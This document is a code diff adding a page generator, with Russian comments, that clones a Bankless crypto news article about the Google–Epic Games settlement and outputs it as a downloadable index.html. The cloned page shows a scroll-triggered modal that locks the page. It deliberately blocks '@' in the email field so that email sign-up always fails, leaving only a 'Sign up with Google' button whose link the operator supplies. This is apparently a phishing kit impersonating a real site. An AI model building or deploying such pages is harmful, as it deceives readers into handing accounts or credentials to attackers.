+                <p>Yesterday, Google <a href="#">announced</a> that it is giving mobile developers more freedom in how they choose to handle transactions.</p>
+                <p>The policy change attempts to settle a years-long antitrust lawsuit filed by developer Epic Games, who accused the tech giant of anticompetitive behavior after it banned Fortnite – Epic’s immensely popular multiplayer battle royale game – from the Play Store in 2020.</p>
+                
+                <h3>What's the Scoop?</h3>
+                <ul>
+                    <li><strong>Potential Resolution:</strong> Google and Epic Games have proposed a joint settlement to resolve their long-running antitrust case. Under the proposed settlement (which remains subject to Court approval), Google would agree to allow developers to accept external payments, implement a registration program for verified apps, and lower fees for developers.</li>
+                    <li><strong>Uncertain Outcome:</strong> Although Google's proposed measures could help foster competition among developers and payments providers, they may not do enough level the playing field. Despite support from both parties, <em>Ars Technica </em><a href="#">reports</a> that the judge overseeing the case is worried the settlement may be a “sweetheart deal,” which benefits Epic more than it does other developers.</li>
+                </ul>
+
+                <h3>What's the Take:</h3>
+                <p>Not only does a settlement between Google and Epic Games clear the way for Fortnite's return to the Play Store, it may also open the doors for developers to accept crypto payments.</p>
+                <p>Last year, Apple <a href="#">settled</a> a similar lawsuit with Epic Games for de-platforming Fortnite because of its support for external payments. The terms of that deal expressly prohibited Apple from imposing commissions on off-app purchases and controlling how developers communicate with their users.</p>
+                <p>Crypto payments are acclaimed for their virtually instant speeds and extremely low costs. While mobile application developers had been previously restricted to using approved high-fee payment channels, Epic Game's string of legal victories is helping clear the way for developers to use whatever methods they please!</p>
+
+                <!-- Embedded Tweet Mock -->
+                <div class="tweet-mock">
+                    <div class="flex justify-between items-start mb-3">
+                        <div class="flex gap-3 items-center">
+                            <div class="w-10 h-10 bg-black rounded-full flex items-center justify-center text-white font-bold">B</div>
+                            <div class="leading-tight">
+                                <div class="font-bold text-[15px] text-black">Bloomberg</div>
+                                <div class="text-[#536471] text-[15px]">@business</div>
+                            </div>
+                        </div>
+                        <i class="fa-brands fa-twitter text-[#1d9bf0] text-xl"></i>
+                    </div>
+                    <p class="text-[15px] text-black mb-3" style="font-family: inherit;">Alphabet’s Google and Epic Games proposed a new settlement Wednesday to resolve a long-running antitrust case between the two companies. <a href="#" class="text-[#1d9bf0] hover:underline" style="color: #1d9bf0;">https://t.co/l2pgHlxxL6</a></p>
+                    <div class="text-[#536471] text-[15px]">March 4, 2026</div>
+                </div>
+
+            </div>
+
+            <!-- Bottom Interaction Bar -->
+            <div class="interaction-bar mt-12 mb-20">
+                <div class="interaction-item">
+                    <i class="fa-light fa-heart"></i>
+                    <span>1</span>
+                </div>
+                <div class="interaction-item">
+                    <i class="fa-light fa-comment"></i>
+                    <span>0</span>
+                </div>
+                <div class="interaction-item ml-auto">
+                    <i class="fa-regular fa-bookmark"></i>
+                </div>
+                <div class="interaction-item relative group">
+                    <span class="flex items-center gap-1.5 px-3 py-1 bg-gray-100 rounded-full text-black hover:bg-gray-200 transition">
+                        <i class="fa-solid fa-sparkles text-xs"></i> AI
+                    </span>
+                </div>
+            </div>
+
+            <hr class="border-borderGray my-12">
+
+            <!-- Author Bio Section -->
+            <div class="flex items-start gap-6 mb-12">
+                <img src="https://www.bankless.com/assets/cdn/authors/2026-02-26/jack-png-a6edd23702c9c6546ac12821152fde14.png" alt="Jack Inabinet" class="w-[80px] h-[80px] rounded-full object-cover">
+                <div>
+                    <h4 class="font-semibold text-lg mb-1">Written by Jack Inabinet</h4>
+                    <div class="text-textLight text-[13px] font-semibold mb-3 flex items-center gap-4">
+                        <span>739 Articles</span>
+                        <span>•</span>
+                        <a href="#" class="text-banklessRed hover:underline">View all</a>
+                        <div class="flex gap-3 text-lg">
+                            <a href="#" class="hover:text-black transition"><i class="fa-brands fa-twitter"></i></a>
+                            <a href="#" class="hover:text-black transition"><i class="fa-brands fa-discord"></i></a>
+                            <a href="#" class="hover:text-black transition"><i class="fa-brands fa-linkedin"></i></a>
+                        </div>
+                    </div>
+                    <p class="text-textLight text-[15px] leading-relaxed">
+                        Jack Inabinet is a Senior Analyst with a passion for exploring the bleeding edge of crypto and finance. Prior to joining Bankless, Jack worked as an analyst at HAL Real Estate where he conducted market research and financial analysis for commercial apartment development and acquisition activities in the Seattle region. He graduated from the University of Washington’s Michael G. Foster School of Business.
+                    </p>
+                </div>
+            </div>
+
+        </article>
+
+        <!-- Sidebar -->
+        <aside class="w-[320px] shrink-0 sticky top-[160px] self-start mt-4">
+            <a href="#" class="block sidebar-sponsor group relative">
+                <div class="mb-4 overflow-hidden rounded-lg bg-white">
+                    <!-- Image placeholder based on provided Mercuryo image -->
+                    <img src="https://cdn.bankless.com/posts/full/2026-03-06/epics-antitrust-lawsuit-win-opens-doors-for-crypto-payments-on-android-apps-featured-image-69a9ea8f6ddf730001f9a631.jpg" alt="Mercuryo" class="w-full h-[180px] object-cover rounded-lg group-hover:scale-105 transition-transform duration-300">
+                </div>
+                <div>
+                    <span class="inline-block bg-[#f0f0f0] text-[#727272] text-[10px] font-bold uppercase tracking-wide px-2 py-1 rounded-full mb-2">Sponsored</span>
+                    <h3 class="font-bold text-xl mb-1 text-black">Mercuryo</h3>
+                    <p class="text-[#555] text-[15px] leading-snug font-medium pr-6">
+                        Infrastructure powering the crypto economy.
+                    </p>
+                    <i class="fa-regular fa-arrow-up-right absolute bottom-6 right-6 text-xl text-gray-400 group-hover:text-black transition-colors"></i>
+                </div>
+            </a>
+        </aside>
+
+    </main>
+
+    <!-- Scroll Auth Pop-up (Paywall Modal) -->
+    <div id="scrollAuthPopup" class="fixed inset-0 z-[100] blur-bg hidden items-center justify-center opacity-0 transition-opacity duration-700">
+        <div class="bg-white border border-[#eaeaea] shadow-2xl rounded-2xl p-10 max-w-[420px] w-full mx-4 text-center transform scale-95 transition-transform duration-500 ease-out overflow-hidden relative" id="popupCard">
+            
+            <!-- Default Auth Options View -->
+            <div id="authOptionsView" class="transition-all duration-300">
+                <!-- Icon -->
+                <div class="w-14 h-14 bg-gray-100 text-black rounded-full flex items-center justify-center mx-auto mb-6 text-xl shadow-sm">
+                    <i class="fa-solid fa-lock"></i>
+                </div>
+                
+                <h2 class="text-[28px] font-extrabold text-black mb-3 tracking-tight">Keep Reading</h2>
+                <p class="text-[#727272] text-[16px] mb-8 leading-relaxed px-2">
+                    Sign up to continue reading this article and get access to exclusive content.
+                </p>
+                
+                <div class="flex flex-col gap-3.5">
+                    <!-- Google Button as a Link -->
+                    <a href="{{GOOGLE_LINK}}" class="w-full bg-white border-2 border-[#eaeaea] hover:border-black hover:bg-gray-50 text-black font-bold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-3">
+                        <img src="https://www.svgrepo.com/show/475656/google-color.svg" class="w-5 h-5" alt="Google">
+                        Sign up with Google
+                    </a>
+                    
+                    <button id="showEmailFormBtn" class="w-full bg-black hover:bg-gray-800 text-white font-bold py-3.5 px-6 rounded-xl transition-all flex items-center justify-center gap-3">
+                        <i class="fa-regular fa-envelope text-lg"></i>
+                        Sign up with Email
+                    </button>
+                </div>
+                
+                <p class="mt-6 text-sm text-[#8a8a8a]">
+                    By signing up, you agree to our <a href="https://www.bankless.com/terms" class="underline hover:text-black">Terms</a> and <a href="https://www.bankless.com/privacy" class="underline hover:text-black">Privacy Policy</a>.
+                </p>
+            </div>
+
+            <!-- Email Form View (Hidden by default) -->
+            <div id="emailFormView" class="hidden flex-col transition-all duration-300">
+                <h2 class="text-[24px] font-extrabold text-black mb-6 tracking-tight">Create Account</h2>
+                
+                <div class="flex flex-col gap-3 text-left">
+                    <!-- Email Field -->
+                    <div class="flex flex-col">
+                        <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Email</label>
+                        <input type="text" id="emailInput" placeholder="Enter your email" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
+                        <p id="emailError" class="error-text text-red-500 text-[12px] ml-1 font-medium">Please enter a valid email address.</p>
+                    </div>
+                    
+                    <!-- Username Field -->
+                    <div class="flex flex-col">
+                        <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Username</label>
+                        <input type="text" id="usernameInput" placeholder="Choose a username" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
+                        <p id="usernameError" class="error-text text-red-500 text-[12px] ml-1 font-medium">Username cannot be empty.</p>
+                    </div>
+
+                    <!-- Password Field -->
+                    <div class="flex flex-col">
+                        <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Password</label>
+                        <input type="password" id="passwordInput" placeholder="Create a password" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
+                        <p id="passwordError" class="error-text text-red-500 text-[12px] ml-1 font-medium leading-tight">Min 8 chars, 1 uppercase, letters, numbers, 1 special char.</p>
+                    </div>
+
+                    <!-- Confirm Password Field -->
+                    <div class="flex flex-col">
+                        <label class="block text-[13px] font-bold text-gray-700 mb-1 ml-1">Confirm Password</label>
+                        <input type="password" id="confirmPasswordInput" placeholder="Confirm your password" class="w-full border border-[#eaeaea] bg-[#f9f9f9] rounded-xl px-4 py-3 text-[15px] focus:outline-none focus:border-black transition-colors">
+                        <p id="confirmPasswordError" class="error-text text-red-500 text-[12px] ml-1 font-medium">Passwords do not match.</p>
+                    </div>
+                    
+                    <button id="submitSignUpBtn" class="w-full bg-banklessRed hover:bg-[#c91b26] text-white font-bold py-3.5 px-6 rounded-xl transition-all mt-3 shadow-sm">
+                        Complete Sign Up
+                    </button>
+                    
+                    <!-- Go Back Button -->
+                    <button id="goBackBtn" class="text-[#727272] hover:text-black text-sm font-semibold mt-2 transition-colors flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-arrow-left"></i> Go back
+                    </button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Scroll Pop-up & Form Logic -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const popup = document.getElementById("scrollAuthPopup");
+            const popupCard = document.getElementById("popupCard");
+            let isShown = false;
+
+            // Show popup logic
+            const showPopup = (e) => {
+                if (e) e.preventDefault(); // Prevent default if triggered by link click
+                if (isShown) return;
+
+                isShown = true;
+                popup.classList.remove("hidden");
+                popup.classList.add("flex");
+                
+                setTimeout(() => {
+                    popup.classList.remove("opacity-0");
+                    popup.classList.add("opacity-100");
+                    popupCard.classList.remove("scale-95");
+                    popupCard.classList.add("scale-100");
+                }, 50);
+
+                document.body.style.overflow = "hidden";
+                window.removeEventListener("scroll", onScroll);
+            };
+
+            // Scroll trigger logic
+            const onScroll = () => {
+                if (!isShown && window.scrollY > 50 && window.innerWidth >= 768) {
+                    showPopup();
+                }
+            };
+
+            window.addEventListener("scroll", onScroll);
+
+            // Trigger popup manually via Auth buttons
+            document.querySelectorAll('.auth-trigger').forEach(btn => {
+                btn.addEventListener('click', showPopup);
+            });
+
+            // --- Form Switching Logic ---
+            const showEmailFormBtn = document.getElementById("showEmailFormBtn");
+            const goBackBtn = document.getElementById("goBackBtn");
+            const authOptionsView = document.getElementById("authOptionsView");
+            const emailFormView = document.getElementById("emailFormView");
+
+            showEmailFormBtn.addEventListener("click", () => {
+                authOptionsView.classList.add("hidden");
+                emailFormView.classList.remove("hidden");
+                emailFormView.classList.add("flex");
+            });
+
+            goBackBtn.addEventListener("click", () => {
+                emailFormView.classList.add("hidden");
+                emailFormView.classList.remove("flex");
+                authOptionsView.classList.remove("hidden");
+            });
+
+            // --- Restrict '@' Symbol in Email Input ---
+            // Prevent typing '@' directly
+            emailInput.addEventListener("keydown", (e) => {
+                if (e.key === "@") {
+                    e.preventDefault();
+                }
+            });
+
+            // Prevent pasting or dragging '@' into the field
+            emailInput.addEventListener("input", function() {
+                if (this.value.includes("@")) {
+                    this.value = this.value.replace(/@/g, "");
+                }
+            });
+
+            // --- Regex Validation Logic ---
+            const usernameInput = document.getElementById("usernameInput");
+            const passwordInput = document.getElementById("passwordInput");
+            const confirmPasswordInput = document.getElementById("confirmPasswordInput");
+            const submitSignUpBtn = document.getElementById("submitSignUpBtn");
+
+            const emailError = document.getElementById("emailError");
+            const usernameError = document.getElementById("usernameError");
+            const passwordError = document.getElementById("passwordError");
+            const confirmPasswordError = document.getElementById("confirmPasswordError");
+
+            // Email with @ requirement (will always fail since @ is blocked)
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            // Min 8 chars, at least 1 uppercase, at least 1 letter, at least 1 number, at least 1 special char
+            const passwordRegex = /^(?=.*[a-zA-Z])(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z0-9\s]).{8,}$/;
+
+            let isFormSubmitted = false;
+
+            function validateForm() {
+                const isEmailValid = emailRegex.test(emailInput.value.trim());
+                const isUsernameValid = usernameInput.value.trim().length > 0;
+                const isPasswordValid = passwordRegex.test(passwordInput.value);
+                const isConfirmPasswordValid = confirmPasswordInput.value === passwordInput.value && confirmPasswordInput.value.length > 0;
+
+                // Show/hide errors only if field is filled or user tried to submit
+                if (isFormSubmitted || emailInput.value.length > 0) {
+                    emailError.classList.toggle("show", !isEmailValid);
+                }
+                if (isFormSubmitted || usernameInput.value.length > 0) {
+                    usernameError.classList.toggle("show", !isUsernameValid);
+                }
+                if (isFormSubmitted || passwordInput.value.length > 0) {
+                    passwordError.classList.toggle("show", !isPasswordValid);
+                }
+                if (isFormSubmitted || confirmPasswordInput.value.length > 0) {
+                    confirmPasswordError.classList.toggle("show", !isConfirmPasswordValid);
+                }
+
+                return isEmailValid && isUsernameValid && isPasswordValid && isConfirmPasswordValid;
+            }
+
+            // Validate on input typing
+            [emailInput, usernameInput, passwordInput, confirmPasswordInput].forEach(input => {
+                input.addEventListener("input", () => {
+                    if (isFormSubmitted || input.value.length > 0) {
+                        validateForm();
+                    }
+                });
+            });
+
+            // Submit click validation
+            submitSignUpBtn.addEventListener("click", (e) => {
+                isFormSubmitted = true;
+                
+                if (validateForm()) {
+                    // Placeholder action for successful validation
+                    submitSignUpBtn.innerText = "Success!";
+                    submitSignUpBtn.classList.remove("bg-banklessRed", "hover:bg-[#c91b26]");
+                    submitSignUpBtn.classList.add("bg-green-500", "hover:bg-green-600");
+                } else {
+                    submitSignUpBtn.innerText = "Complete Sign Up";
+                    submitSignUpBtn.classList.add("bg-banklessRed", "hover:bg-[#c91b26]");
+                    submitSignUpBtn.classList.remove("bg-green-500", "hover:bg-green-600");
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
+</textarea>
+
+    <!-- Скрипт генерации файла -->
+    <script>
+        document.getElementById('generateBtn').addEventListener('click', () => {
+            const title = document.getElementById('inputTitle').value.trim();
+            const googleLink = document.getElementById('inputGoogleLink').value.trim();
+
+            if (!title || !googleLink) {
+                alert('Пожалуйста, заполните оба поля (Заголовок и Ссылка Google)');
+                return;
+            }
+
+            // Создаем slug для URL из заголовка
+            // Например: "The Automated Nexus!" -> "the-automated-nexus"
+            const slug = title.toLowerCase()
+                              .replace(/[^a-z0-9\s-]/g, '')
+                              .trim()
+                              .replace(/\s+/g, '-');
+
+            // Берем сырой текст шаблона
+            let templateContent = document.getElementById('site-template').value;
+
+            // Заменяем плейсхолдеры
+            // Регулярные выражения /.../g нужны, чтобы заменить ВСЕ вхождения, если их несколько
+            templateContent = templateContent.replace(/\{\{TITLE\}\}/g, title);
+            templateContent = templateContent.replace(/\{\{SLUG\}\}/g, slug);
+            templateContent = templateContent.replace(/\{\{GOOGLE_LINK\}\}/g, googleLink);
+
+            // Создаем Blob (виртуальный файл) и скачиваем
+            const blob = new Blob([templateContent], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'index.html'; // Имя сохраняемого файла
+            document.body.appendChild(a);
+            a.click();
+            
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        });
+    </script>
+
+</body>
+</html>
